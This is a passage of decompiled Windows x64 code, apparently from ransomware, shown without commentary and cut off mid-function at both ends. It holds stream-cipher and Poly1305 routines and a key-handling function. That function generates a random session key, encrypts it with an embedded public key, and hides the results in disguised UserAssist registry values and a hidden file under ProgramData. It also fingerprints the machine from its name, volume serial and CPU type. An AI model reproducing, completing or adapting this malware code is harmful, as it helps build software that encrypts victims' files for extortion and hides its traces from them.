        + ((*(_DWORD *)(a1 + 4LL * (v5 - 1)) >> 10)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 1)), 19)
         ^ __ROR4__(*(_DWORD *)(a1 + 4LL * (v5 - 1)), 17))
        + ((v18 >> 3) ^ __ROR4__(v18, 7) ^ __ROR4__(v18, 18))
        + v16;
    *(_DWORD *)(a1 + 4LL * (v5 + 1)) = v19;
    v20 = *(_DWORD *)(a1 + 4LL * (v5 - 13));
    *(_DWORD *)(a1 + 4LL * (v5 + 2)) = *(_DWORD *)(a1 + 4LL * (v5 - 5))
                                     + v18
                                     + v5
                                     + 258
                                     + ((v20 >> 3) ^ __ROR4__(v20, 7) ^ __ROR4__(v20, 18))
                                     + ((v17 >> 10) ^ __ROR4__(v17, 19) ^ __ROR4__(v17, 17));
    v21 = v5 - 4;
    v22 = *(_DWORD *)(a1 + 4LL * (v5 - 12));
    v23 = v20 + v5 + ((v22 >> 3) ^ __ROR4__(v22, 7) ^ __ROR4__(v22, 18));
    v24 = v5 + 3;
    v5 += 4;
    *(_DWORD *)(a1 + 4 * v24) = *(_DWORD *)(a1 + 4 * v21)
                              + v23
                              + ((v19 >> 10) ^ __ROR4__(v19, 19) ^ __ROR4__(v19, 17))
                              + 259;
  }
  while ( v5 < 0x400 );
  *(_DWORD *)(a1 + 4224) = 0;
  v25 = 64;
  *(_DWORD *)(a1 + 4096) = *(_DWORD *)(a1 + 1984);
  *(_DWORD *)(a1 + 4100) = *(_DWORD *)(a1 + 1988);
  *(_DWORD *)(a1 + 4104) = *(_DWORD *)(a1 + 1992);
  *(_DWORD *)(a1 + 4108) = *(_DWORD *)(a1 + 1996);
  *(_DWORD *)(a1 + 4112) = *(_DWORD *)(a1 + 2000);
  *(_DWORD *)(a1 + 4116) = *(_DWORD *)(a1 + 2004);
  *(_DWORD *)(a1 + 4120) = *(_DWORD *)(a1 + 2008);
  *(_DWORD *)(a1 + 4124) = *(_DWORD *)(a1 + 2012);
  *(_DWORD *)(a1 + 4128) = *(_DWORD *)(a1 + 2016);
  *(_DWORD *)(a1 + 4132) = *(_DWORD *)(a1 + 2020);
  *(_DWORD *)(a1 + 4136) = *(_DWORD *)(a1 + 2024);
  *(_DWORD *)(a1 + 4140) = *(_DWORD *)(a1 + 2028);
  *(_DWORD *)(a1 + 4144) = *(_DWORD *)(a1 + 2032);
  *(_DWORD *)(a1 + 4148) = *(_DWORD *)(a1 + 2036);
  *(_DWORD *)(a1 + 4152) = *(_DWORD *)(a1 + 2040);
  *(_DWORD *)(a1 + 4156) = *(_DWORD *)(a1 + 2044);
  *(_DWORD *)(a1 + 4160) = *(_DWORD *)(a1 + 4032);
  *(_DWORD *)(a1 + 4164) = *(_DWORD *)(a1 + 4036);
  *(_DWORD *)(a1 + 4168) = *(_DWORD *)(a1 + 4040);
  *(_DWORD *)(a1 + 4172) = *(_DWORD *)(a1 + 4044);
  *(_DWORD *)(a1 + 4176) = *(_DWORD *)(a1 + 4048);
  *(_DWORD *)(a1 + 4180) = *(_DWORD *)(a1 + 4052);
  *(_DWORD *)(a1 + 4184) = *(_DWORD *)(a1 + 4056);
  *(_DWORD *)(a1 + 4188) = *(_DWORD *)(a1 + 4060);
  *(_DWORD *)(a1 + 4192) = *(_DWORD *)(a1 + 4064);
  *(_DWORD *)(a1 + 4196) = *(_DWORD *)(a1 + 4068);
  *(_DWORD *)(a1 + 4200) = *(_DWORD *)(a1 + 4072);
  *(_DWORD *)(a1 + 4204) = *(_DWORD *)(a1 + 4076);
  *(_DWORD *)(a1 + 4208) = *(_DWORD *)(a1 + 4080);
  *(_DWORD *)(a1 + 4212) = *(_DWORD *)(a1 + 4084);
  *(_DWORD *)(a1 + 4216) = *(_DWORD *)(a1 + 4088);
  *(_DWORD *)(a1 + 4220) = *(_DWORD *)(a1 + 4092);
  do
  {
    result = sub_140015150((_DWORD *)a1);
    --v25;
  }
  while ( v25 != 0 );
  return result;
}


// ----- sub_140016280 @ 0x140016280 -----
void __fastcall sub_140016280(__int64 a1, _DWORD *a2, const __m128i *a3, unsigned __int64 a4, unsigned int a5)
{
  unsigned int i; // esi
  __int64 j; // rax
  __m128 v10; // xmm1
  __m128 v11; // xmm0
  __m128 v12; // xmm1
  __int64 v13; // rdx
  __int64 v14; // rcx
  unsigned __int64 v15; // r8
  __int64 v16; // rax
  __m128 v17; // xmm0
  __int64 v18; // rax
  __m128 v19[3]; // [rsp+20h] [rbp-68h] BYREF
  __m128 v20; // [rsp+50h] [rbp-38h] BYREF

  for ( i = a5; i >= 0x40; a4 += 64LL )
  {
    sub_1400145B0(a2, (int *)v19);
    if ( (a4 > (unsigned __int64)&v20.m128_u64[1] + 4 || a4 + 60 < (unsigned __int64)v19)
      && (a4 > (unsigned __int64)&a3[3].m128i_u64[1] + 4 || a4 + 60 < (unsigned __int64)a3) )
    {
      v10 = _mm_xor_ps((__m128)_mm_loadu_si128(a3 + 1), v19[1]);
      *(__m128 *)a4 = _mm_xor_ps((__m128)_mm_loadu_si128(a3), v19[0]);
      v11 = (__m128)_mm_loadu_si128(a3 + 2);
      *(__m128 *)(a4 + 16) = v10;
      v12 = _mm_xor_ps((__m128)_mm_loadu_si128(a3 + 3), v20);
      *(__m128 *)(a4 + 32) = _mm_xor_ps(v11, v19[2]);
      *(__m128 *)(a4 + 48) = v12;
    }
    else
    {
      for ( j = 0; j != 16; ++j )
        *(_DWORD *)(a4 + 4 * j) = v19[0].m128_i32[j] ^ a3->m128i_i32[j];
    }
    i -= 64;
    a3 += 4;
  }
  if ( i != 0 )
  {
    sub_1400145B0(a2, (int *)v19);
    v13 = 0;
    if ( i < 8 )
      goto LABEL_25;
    v14 = i - 1;
    v15 = v14 + a4;
    if ( a4 <= (unsigned __int64)v19 + v14 && v15 >= (unsigned __int64)v19 )
      goto LABEL_25;
    if ( a4 <= (unsigned __int64)a3->m128i_u64 + v14 && v15 >= (unsigned __int64)a3 )
      goto LABEL_25;
    if ( i < 0x40 )
      goto LABEL_26;
    do
    {
      v16 = (unsigned int)(v13 + 16);
      v17 = (__m128)_mm_loadu_si128((const __m128i *)((char *)v19 + v16));
      *(__m128 *)(a4 + v13) = _mm_xor_ps(
                                (__m128)_mm_loadu_si128((const __m128i *)((char *)a3 + v13)),
                                (__m128)_mm_loadu_si128((const __m128i *)((char *)v19 + v13)));
      *(__m128 *)(a4 + v16) = _mm_xor_ps((__m128)_mm_loadu_si128((const __m128i *)((char *)a3 + v16)), v17);
      *(__m128 *)(a4 + (unsigned int)(v13 + 32)) = _mm_xor_ps(
                                                     (__m128)_mm_loadu_si128((const __m128i *)((char *)a3
                                                                                             + (unsigned int)(v13 + 32))),
                                                     (__m128)_mm_loadu_si128((const __m128i *)((char *)v19
                                                                                             + (unsigned int)(v13 + 32))));
      v18 = (unsigned int)(v13 + 48);
      v13 = (unsigned int)(v13 + 64);
      *(__m128 *)(a4 + v18) = _mm_xor_ps(
                                (__m128)_mm_loadu_si128((const __m128i *)((char *)a3 + v18)),
                                (__m128)_mm_loadu_si128((const __m128i *)((char *)v19 + v18)));
    }
    while ( (unsigned int)v13 < (i & 0xFFFFFFC0) );
    if ( (i & 0x38) != 0 )
    {
LABEL_26:
      do
      {
        *(_QWORD *)(a4 + v13) = *(__int64 *)((char *)a3->m128i_i64 + v13)
                              ^ *(unsigned __int64 *)((char *)v19[0].m128_u64 + v13);
        v13 = (unsigned int)(v13 + 8);
      }
      while ( (unsigned int)v13 < (i & 0xFFFFFFF8) );
    }
    if ( (unsigned int)v13 < i )
    {
LABEL_25:
      do
      {
        *(_BYTE *)(a4 + v13) = v19[0].m128_i8[v13] ^ a3->m128i_i8[v13];
        v13 = (unsigned int)(v13 + 1);
      }
      while ( (unsigned int)v13 < i );
    }
  }
}


// ----- sub_140016470 @ 0x140016470 -----
__int64 sub_140016470()
{
  unsigned int v1; // ecx
  __int64 v2; // rbx
  LSTATUS Value; // esi
  LSTATUS v4; // edi
  HCRYPTPROV v5; // rcx
  BOOL v6; // edi
  __int64 v7; // rdi
  HANDLE FileW; // rax
  void *v9; // rdi
  BYTE *p_pbBuffer; // rax
  BYTE *v11; // rax
  BYTE pbBuffer; // [rsp+50h] [rbp-B0h] BYREF
  _BYTE v13[31]; // [rsp+51h] [rbp-AFh]
  CHAR Buffer[16]; // [rsp+70h] [rbp-90h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [rsp+80h] [rbp-80h] BYREF
  WCHAR String1[264]; // [rsp+B0h] [rbp-50h] BYREF
  HKEY cbData; // [rsp+2F0h] [rbp+1F0h] BYREF
  HKEY hKey; // [rsp+2F8h] [rbp+1F8h] BYREF

  if ( dword_1400273DC != 0 )
    return 1;
  v1 = 8;
  while ( pbData[v1] == 0 )
  {
    if ( ++v1 >= 0x20 )
      return 0;
  }
  v2 = 32;
  if ( RegOpenKeyExW(
         HKEY_CURRENT_USER,
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
         0,
         0x20019u,
         &hKey) == 0 )
  {
    LODWORD(cbData) = 32;
    Value = RegQueryValueExW(hKey, L"{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", nullptr, nullptr, &Data, (LPDWORD)&cbData);
    LODWORD(cbData) = 512;
    v4 = RegQueryValueExW(
           hKey,
           L"{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}",
           nullptr,
           nullptr,
           &byte_1400271B0,
           (LPDWORD)&cbData);
    RegCloseKey(hKey);
    if ( (v4 | Value) == 0 )
    {
LABEL_25:
      dword_1400273DC = 1;
      return 1;
    }
  }
  v5 = phProv;
  if ( phProv == 0 )
  {
    if ( !CryptAcquireContextA(&phProv, nullptr, nullptr, 1u, 0xF0000000) )
      return 0;
    v5 = phProv;
  }
  if ( CryptGenRandom(v5, 0x20u, &pbBuffer) )
  {
    pbBuffer &= 0xF8u;
    v13[30] = v13[30] & 0x3F | 0x40;
    sub_14000D760((__int64)&Data, (__int64)&pbBuffer, (__int64)qword_140002A30);
    hKey = nullptr;
    if ( CryptImportKey(phProv, pbData, 0x220u, 0, 0, (HCRYPTKEY *)&hKey) )
    {
      byte_1400271B0 = pbBuffer;
      qmemcpy(byte_1400271B1, v13, sizeof(byte_1400271B1));
      LODWORD(cbData) = 32;
      v6 = CryptEncrypt((HCRYPTKEY)hKey, 0, true, 0, &byte_1400271B0, (DWORD *)&cbData, 0x200u);
      CryptDestroyKey((HCRYPTKEY)hKey);
      if ( v6 )
      {
        dword_1400273B0 = GetTickCount();
        qword_1400273B4 = sub_140019FA0(0);
        LODWORD(cbData) = 16;
        v7 = 0;
        if ( GetComputerNameA(Buffer, (LPDWORD)&cbData) )
        {
          v7 = (unsigned int)cbData;
          sub_140022A10(String1, Buffer, (unsigned int)cbData);
        }
        if ( GetVolumeInformationA("C:\\", nullptr, 0, (LPDWORD)&hKey, nullptr, nullptr, nullptr, 0) )
        {
          *(_DWORD *)((char *)String1 + v7) = (_DWORD)hKey;
          v7 += 4;
        }
        GetSystemInfo(&SystemInfo);
        *(_DWORD *)((char *)String1 + v7) = SystemInfo.dwProcessorType;
        sub_14000C8E0(String1, v7 + 4, (__int64)&unk_1400273BC, 32);
        if ( RegCreateKeyExW(
               HKEY_CURRENT_USER,
               L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
               0,
               nullptr,
               0,
               0x20006u,
               nullptr,
               &cbData,
               nullptr) == 0 )
        {
          RegSetValueExW(cbData, L"{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", 0, 3u, &Data, 0x20u);
          RegSetValueExW(cbData, L"{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}", 0, 3u, &byte_1400271B0, 0x200u);
          RegCloseKey(cbData);
        }
        lstrcpyW(String1, L"C:\\ProgramData\\Microsoft\\Windows\\Caches");
        CreateDirectoryW(String1, nullptr);
        SetFileAttributesW(String1, 6u);
        FileW = CreateFileW(
                  L"C:\\ProgramData\\Microsoft\\Windows\\Caches\\{6D809377-6AF0-444B-8957-A3773F02200E}.db",
                  0x40000000u,
                  0,
                  nullptr,
                  2u,
                  6u,
                  nullptr);
        v9 = FileW;
        if ( FileW != (HANDLE)-1LL )
        {
          WriteFile(FileW, &Data, 0x24Cu, (LPDWORD)&cbData, nullptr);
          CloseHandle(v9);
        }
        p_pbBuffer = &pbBuffer;
        do
        {
          *p_pbBuffer++ = 0;
          --v2;
        }
        while ( v2 != 0 );
        goto LABEL_25;
      }
    }
    v11 = &pbBuffer;
    do
    {
      *v11++ = 0;
      --v2;
    }
    while ( v2 != 0 );
  }
  return 0;
}


// ----- sub_140016940 @ 0x140016940 -----
__int64 __fastcall sub_140016940(_OWORD *a1)
{
  __int64 result; // rax

  if ( dword_1400273DC != 0 || (_DWORD)(result = sub_140016470()) != 0 )
  {
    *a1 = *(_OWORD *)&Data;
    a1[1] = xmmword_1400271A0;
    return 1;
  }
  return result;
}


// ----- sub_140016990 @ 0x140016990 -----
__int64 __fastcall sub_140016990(__int64 a1)
{
  __int64 result; // rax

  if ( dword_1400273DC != 0 || (_DWORD)(result = sub_140016470()) != 0 )
  {
    sub_140022A10(a1, &byte_1400271B0, 512);
    return 1;
  }
  return result;
}


// ----- sub_1400169E0 @ 0x1400169e0 -----
void __fastcall sub_1400169E0(_BYTE *a1, __int64 a2)
{
  for ( ; a2 != 0; --a2 )
    *a1++ = 0;
}


// ----- sub_140016A10 @ 0x140016a10 -----
BOOL __fastcall sub_140016A10(BYTE *a1, DWORD a2)
{
  HCRYPTPROV v4; // rcx
  BOOL result; // eax

  v4 = phProv;
  if ( phProv == 0 )
  {
    result = CryptAcquireContextA(&phProv, nullptr, nullptr, 1u, 0xF0000000);
    if ( !result )
      return result;
    v4 = phProv;
  }
  return CryptGenRandom(v4, a2, a1);
}


// ----- sub_140016A80 @ 0x140016a80 -----
__int64 __fastcall sub_140016A80(__int64 a1)
{
  __int64 v2; // rbx
  CHAR Buffer[16]; // [rsp+40h] [rbp-148h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [rsp+50h] [rbp-138h] BYREF
  _OWORD v6[16]; // [rsp+80h] [rbp-108h] BYREF
  DWORD v7; // [rsp+198h] [rbp+10h] BYREF
  DWORD VolumeSerialNumber; // [rsp+1A0h] [rbp+18h] BYREF

  v7 = 16;
  v2 = 0;
  if ( GetComputerNameA(Buffer, &v7) )
  {
    v2 = v7;
    sub_140022A10(v6, Buffer, v7);
  }
  if ( GetVolumeInformationA("C:\\", nullptr, 0, &VolumeSerialNumber, nullptr, nullptr, nullptr, 0) )
  {
    *(_DWORD *)((char *)v6 + v2) = VolumeSerialNumber;
    v2 += 4;
  }
  GetSystemInfo(&SystemInfo);
  *(_DWORD *)((char *)v6 + v2) = SystemInfo.dwProcessorType;
  return sub_14000C8E0(v6, v2 + 4, a1, 32);
}


// ----- sub_140016B60 @ 0x140016b60 -----
__int64 __fastcall sub_140016B60(__int64 a1, __int64 a2, BYTE *a3, DWORD *a4)
{
  unsigned int v5; // ebx
  DWORD pdwDataLen; // [rsp+40h] [rbp-38h] BYREF
  HCRYPTKEY hKey[6]; // [rsp+48h] [rbp-30h] BYREF

  hKey[0] = 0;
  v5 = 0;
  if ( CryptImportKey(phProv, pbData, 0x220u, 0, 0, hKey) )
  {
    pdwDataLen = a2;
    sub_140022A10(a3, a1, a2);
    if ( CryptEncrypt(hKey[0], 0, true, 0, a3, &pdwDataLen, *a4) )
    {
      v5 = 1;
      *a4 = pdwDataLen;
    }
    CryptDestroyKey(hKey[0]);
  }
  return v5;
}


// ----- sub_140016C50 @ 0x140016c50 -----
__int64 sub_140016C50()
{
  HKEY hKey; // [rsp+60h] [rbp+8h] BYREF

  if ( RegCreateKeyExW(
         HKEY_CURRENT_USER,
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
         0,
         nullptr,
         0,
         0x20006u,
         nullptr,
         &hKey,
         nullptr) != 0 )
    return 0;
  RegSetValueExW(hKey, L"{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", 0, 3u, &Data, 0x20u);
  RegSetValueExW(hKey, L"{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}", 0, 3u, &byte_1400271B0, 0x200u);
  RegCloseKey(hKey);
  return 1;
}


// ----- sub_140016D20 @ 0x140016d20 -----
_BOOL8 sub_140016D20()
{
  LSTATUS v0; // edi
  LSTATUS v1; // ebx
  DWORD cbData; // [rsp+40h] [rbp+8h] BYREF
  HKEY hKey; // [rsp+48h] [rbp+10h] BYREF

  if ( RegOpenKeyExW(
         HKEY_CURRENT_USER,
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
         0,
         0x20019u,
         &hKey) != 0 )
    return false;
  cbData = 32;
  v0 = RegQueryValueExW(hKey, L"{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", nullptr, nullptr, &Data, &cbData);
  cbData = 512;
  v1 = RegQueryValueExW(hKey, L"{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}", nullptr, nullptr, &byte_1400271B0, &cbData);
  RegCloseKey(hKey);
  return (v1 | v0) == 0;
}


// ----- sub_140016E00 @ 0x140016e00 -----
__int64 sub_140016E00()
{
  HANDLE FileW; // rax
  void *v1; // rbx
  WCHAR String1[268]; // [rsp+40h] [rbp-218h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+260h] [rbp+8h] BYREF

  lstrcpyW(String1, L"C:\\ProgramData\\Microsoft\\Windows\\Caches");
  CreateDirectoryW(String1, nullptr);
  SetFileAttributesW(String1, 6u);
  FileW = CreateFileW(
            L"C:\\ProgramData\\Microsoft\\Windows\\Caches\\{6D809377-6AF0-444B-8957-A3773F02200E}.db",
            0x40000000u,
            0,
            nullptr,
            2u,
            6u,
            nullptr);
  v1 = FileW;
  if ( FileW == (HANDLE)-1LL )
    return 0;
  WriteFile(FileW, &Data, 0x24Cu, &NumberOfBytesWritten, nullptr);
  CloseHandle(v1);
  return 1;
}


// ----- sub_140016ED0 @ 0x140016ed0 -----
BYTE *sub_140016ED0()
{
  __int64 v0; // rcx
  BYTE *result; // rax

  if ( phProv != 0 )
  {
    CryptReleaseContext(phProv, 0);
    phProv = 0;
  }
  v0 = 588;
  result = &Data;
  do
  {
    *result++ = 0;
    --v0;
  }
  while ( v0 != 0 );
  dword_1400273DC = 0;
  return result;
}


// ----- sub_140016F20 @ 0x140016f20 -----
HANDLE sub_140016F20()
{
  HANDLE result; // rax

  result = GetProcessHeap();
  hHeap = result;
  return result;
}


// ----- sub_140016F40 @ 0x140016f40 -----
__int64 __fastcall sub_140016F40(__int64 a1, char a2, unsigned __int64 a3)
{
  __int64 result; // rax
  int v4; // [rsp+18h] [rbp+18h]

  v4 = 0;
  for ( result = 0; v4 < a3; result = v4 )
    *(_BYTE *)(a1 + v4++) = a2;
  return result;
}


// ----- sub_140016F80 @ 0x140016f80 -----
__int64 __fastcall sub_140016F80(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 result; // rax
  int v4; // [rsp+18h] [rbp+18h]

  v4 = 0;
  for ( result = 0; v4 < a3; result = v4 )
  {
    *(_BYTE *)(a1 + v4) = *(_BYTE *)(a2 + v4);
    ++v4;
  }
  return result;
}


// ----- sub_140016FD0 @ 0x140016fd0 -----
LPVOID __fastcall sub_140016FD0(__int64 a1)
{
  SIZE_T v1; // rbx
  LPVOID result; // rax

  v1 = a1 + 64;
  do
    result = HeapAlloc(hHeap, 8u, v1);
  while ( result == nullptr );
  return result;
}


// ----- sub_140017010 @ 0x140017010 -----
BOOL __fastcall sub_140017010(void *a1)
{
  return HeapFree(hHeap, 0, a1);
}


// ----- sub_140017030 @ 0x140017030 -----
__int64 __fastcall sub_140017030(__int64 a1, _DWORD *a2)
{
  int v2; // eax
  __int64 result; // rax

  *(_DWORD *)a1 = *a2 & 0x3FFFFFF;
  *(_DWORD *)(a1 + 4) = (*(_DWORD *)((char *)a2 + 3) >> 2) & 0x3FFFF03;
  *(_DWORD *)(a1 + 8) = (*(_DWORD *)((char *)a2 + 6) >> 4) & 0x3FFC0FF;
  *(_DWORD *)(a1 + 12) = (*(_DWORD *)((char *)a2 + 9) >> 6) & 0x3F03FFF;
  v2 = (a2[3] >> 8) & 0xFFFFF;
  *(_QWORD *)(a1 + 20) = 0;
  *(_DWORD *)(a1 + 16) = v2;
  *(_QWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 36) = 0;
  *(_DWORD *)(a1 + 40) = a2[4];
  *(_DWORD *)(a1 + 44) = a2[5];
  *(_DWORD *)(a1 + 48) = a2[6];
  result = (unsigned int)a2[7];
  *(_DWORD *)(a1 + 52) = result;
  *(_QWORD *)(a1 + 72) = 0;
  return result;
}


// ----- sub_1400170B0 @ 0x1400170b0 -----
__int64 __fastcall sub_1400170B0(unsigned int *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 result; // rax
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  __int64 v10; // r13
  __int64 v11; // r14
  __int64 v12; // rbp
  unsigned __int64 v13; // rsi
  unsigned int v14; // r8d
  unsigned int v15; // ecx
  unsigned int v16; // edx
  __int64 v17; // r10
  __int64 v18; // rbp
  __int64 v19; // rdi
  __int64 v20; // r11
  __int64 v21; // r12
  unsigned int v22; // r15d
  int v23; // r13d
  __int64 v24; // r14
  __int64 v25; // r13
  __int64 v26; // rsi
  __int64 v27; // rax
  __int64 v28; // rbp
  __int64 v29; // rcx
  __int64 v30; // r9
  __int64 v31; // rax
  __int64 v32; // r10
  __int64 v33; // rax
  __int64 v34; // r11
  unsigned __int64 v35; // r15
  unsigned __int64 v36; // r10
  __int64 v37; // r8
  __int64 v38; // r13
  unsigned __int64 v39; // r9
  __int64 v40; // r8
  unsigned __int64 v41; // rdx
  unsigned __int64 v42; // rdx
  unsigned __int64 v43; // rcx
  __int64 v44; // [rsp+20h] [rbp-68h]
  __int64 v45; // [rsp+28h] [rbp-60h]
  int v46; // [rsp+30h] [rbp-58h]
  __int64 v47; // [rsp+98h] [rbp+10h]
  unsigned __int64 v48; // [rsp+A0h] [rbp+18h]
  __int64 v49; // [rsp+A8h] [rbp+20h]

  result = *((_QWORD *)a1 + 9);
  if ( result == 0 )
    goto LABEL_10;
  v7 = 16 - result;
  if ( 16 - result > a3 )
    v7 = a3;
  v8 = 0;
  if ( v7 != 0 )
  {
    do
    {
      result = *(unsigned __int8 *)(v8 + a2);
      v9 = v8 + *((_QWORD *)a1 + 9);
      ++v8;
      *((_BYTE *)a1 + v9 + 56) = result;
    }
    while ( v8 < v7 );
    v10 = 56;
    v11 = (__int64)a1;
  }
  else
  {
    v10 = (__int64)a1;
    v11 = 56;
  }
  *((_QWORD *)a1 + 9) += v7;
  if ( *((_QWORD *)a1 + 9) >= 0x10u )
  {
    v12 = v7 + a2;
    v13 = a3 - v7;
    v14 = a1[1];
    v15 = a1[3];
    v16 = a1[2];
    v47 = v12;
    v17 = 5 * v16;
    v18 = a1[6] + ((*(_DWORD *)(v11 + v10 + 3) >> 2) & 0x3FFFFFF);
    v19 = a1[7] + ((*(_DWORD *)(v11 + v10 + 6) >> 4) & 0x3FFFFFF);
    v20 = a1[8] + (*(_DWORD *)(v11 + v10 + 9) >> 6);
    v21 = 5 * a1[4];
    v22 = *(_DWORD *)(v11 + v10 + 12);
    v23 = *(_DWORD *)(v11 + v10);
    v24 = *a1;
    v25 = a1[5] + (v23 & 0x3FFFFFF);
    v49 = v18;
    v45 = a1[9] + ((v22 >> 8) | 0x1000000);
    v44 = v20;
    v48 = v13;
    v26 = 5 * v15;
    v27 = v18 * (unsigned int)v21;
    v28 = v15;
    v29 = v17 * (unsigned int)v45;
    v30 = v19 * (unsigned int)v26 + v27 + v25 * v24 + v45 * 5 * v14;
    v31 = (unsigned int)v17;
    v32 = v20;
    v33 = v20 * v31;
    v34 = v14;
    v46 = v33 + v30;
    v35 = (unsigned int)((unsigned __int64)(v33 + v30) >> 26)
        + v24 * v49
        + v14 * (unsigned __int64)(unsigned int)v25
        + v29
        + v26 * v32
        + v21 * v19;
    v36 = (unsigned int)(v35 >> 26)
        + v24 * v19
        + v14 * v49
        + v16 * (unsigned __int64)(unsigned int)v25
        + v26 * v45
        + v21 * v32;
    v37 = v14 * v19 + v16 * v49 + v28 * (unsigned int)v25 + v21 * v45;
    v38 = a1[4] * v25;
    v39 = v24 * v44 + v37 + (unsigned int)(v36 >> 26);
    a1[7] = v36 & 0x3FFFFFF;
    v40 = v28 * v49;
    a2 = v47;
    a3 = v48;
    v41 = v24 * v45 + v34 * v44 + v16 * v19 + v40 + v38 + (unsigned int)(v39 >> 26);
    a1[8] = v39 & 0x3FFFFFF;
    LODWORD(v33) = (v46 & 0x3FFFFFF) + 5 * (v41 >> 26);
    LODWORD(v29) = (unsigned int)v33 >> 26;
    result = v33 & 0x3FFFFFF;
    a1[6] = v29 + (v35 & 0x3FFFFFF);
    a1[9] = v41 & 0x3FFFFFF;
    a1[5] = result;
    *((_QWORD *)a1 + 9) = 0;
LABEL_10:
    if ( a3 >= 0x10 )
    {
      result = sub_140017710(a1, a2, a3 & 0xFFFFFFFFFFFFFFF0uLL);
      a2 += a3 & 0xFFFFFFFFFFFFFFF0uLL;
      a3 &= 0xFu;
    }
    if ( a3 != 0 )
    {
      v42 = 0;
      do
      {
        result = *(unsigned __int8 *)(v42 + a2);
        v43 = v42 + *((_QWORD *)a1 + 9);
        ++v42;
        *((_BYTE *)a1 + v43 + 56) = result;
      }
      while ( v42 < a3 );
      *((_QWORD *)a1 + 9) += a3;
    }
  }
  return result;
}


// ----- sub_140017400 @ 0x140017400 -----
_DWORD *__fastcall sub_140017400(__int64 a1, _DWORD *a2)
{
  __int64 v2; // rax
  unsigned int v4; // edi
  unsigned int v5; // ebp
  unsigned int v6; // r13d
  unsigned int v7; // esi
  int v8; // r11d
  unsigned int v9; // ebx
  unsigned int v10; // r8d
  unsigned int v11; // r9d
  unsigned int v12; // r15d
  int v13; // r14d
  int v14; // r12d
  unsigned int v15; // r10d
  unsigned int v16; // r11d
  unsigned int v17; // edi
  __int64 v18; // rax
  int v19; // r9d
  unsigned __int64 v20; // r8
  unsigned __int64 v21; // rdx

  v2 = *(_QWORD *)(a1 + 72);
  if ( v2 != 0 )
  {
    *(_BYTE *)(v2 + a1 + 56) = 1;
    if ( (unsigned __int64)(v2 + 1) < 0x10 )
      sub_1400230C0(a1 + 56 + v2 + 1, 0, 15 - v2);
    sub_140017710(a1, a1 + 56, 16);
  }
  v4 = *(_DWORD *)(a1 + 28) + (*(_DWORD *)(a1 + 24) >> 26);
  v5 = *(_DWORD *)(a1 + 32) + (v4 >> 26);
  v6 = *(_DWORD *)(a1 + 36) + (v5 >> 26);
  v7 = *(_DWORD *)(a1 + 20) + 5 * (v6 >> 26);
  v8 = (v7 >> 26) + (*(_DWORD *)(a1 + 24) & 0x3FFFFFF);
  v9 = (v7 & 0x3FFFFFF) + 5;
  v10 = ((v8 + (v9 >> 26)) >> 26) + (v4 & 0x3FFFFFF);
  v11 = (v10 >> 26) + (v5 & 0x3FFFFFF);
  v12 = (v6 & 0x3FFFFFF) - 0x4000000 + (v11 >> 26);
  v13 = (v12 >> 31) - 1;
  v14 = -(v12 >> 31);
  v15 = v8 & v14 | (v8 + (v9 >> 26)) & v13 & 0x3FFFFFF;
  v16 = (v10 & v13 | v4 & v14) & 0x3FFFFFF;
  v17 = (v11 & v13 | v5 & v14) & 0x3FFFFFF;
  v18 = (v9 & v13 | v7 & v14) & 0x3FFFFFF | (v15 << 26);
  v19 = v18 + *(_DWORD *)(a1 + 40);
  v20 = ((v15 >> 6) | (v16 << 20))
      + ((v18 + (unsigned __int64)*(unsigned int *)(a1 + 40)) >> 32)
      + *(unsigned int *)(a1 + 44);
  v21 = HIDWORD(v20) + *(unsigned int *)(a1 + 48) + (((unsigned __int64)v16 >> 12) | (v17 << 14));
  a2[3] = *(_DWORD *)(a1 + 52) + ((v17 >> 18) | ((v12 & v13 | v6 & v14) << 8)) + HIDWORD(v21);
  *a2 = v19;
  a2[1] = v20;
  a2[2] = v21;
  return a2;
}


// ----- sub_1400175F0 @ 0x1400175f0 -----
_DWORD *__fastcall sub_1400175F0(_DWORD *a1, __int64 a2, unsigned __int64 a3, _DWORD *a4)
{
  unsigned __int64 v4; // rdi
  __int64 v5; // rsi
  int v7; // eax
  unsigned __int64 v8; // rbx
  unsigned __int64 i; // rax
  char v10; // cl
  __int64 v11; // rdx
  _DWORD v13[5]; // [rsp+20h] [rbp-78h] BYREF
  __int64 v14; // [rsp+34h] [rbp-64h]
  __int64 v15; // [rsp+3Ch] [rbp-5Ch]
  int v16; // [rsp+44h] [rbp-54h]
  int v17; // [rsp+48h] [rbp-50h]
  int v18; // [rsp+4Ch] [rbp-4Ch]
  int v19; // [rsp+50h] [rbp-48h]
  int v20; // [rsp+54h] [rbp-44h]
  _BYTE v21[16]; // [rsp+58h] [rbp-40h]
  __int64 v22; // [rsp+68h] [rbp-30h]

  v4 = a3;
  v13[0] = *a4 & 0x3FFFFFF;
  v5 = a2;
  v13[1] = (*(_DWORD *)((char *)a4 + 3) >> 2) & 0x3FFFF03;
  v13[2] = (*(_DWORD *)((char *)a4 + 6) >> 4) & 0x3FFC0FF;
  v13[3] = (*(_DWORD *)((char *)a4 + 9) >> 6) & 0x3F03FFF;
  v13[4] = (a4[3] >> 8) & 0xFFFFF;
  v7 = a4[4];
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = v7;
  v18 = a4[5];
  v19 = a4[6];
  v20 = a4[7];
  v22 = 0;
  if ( a3 >= 0x10 )
  {
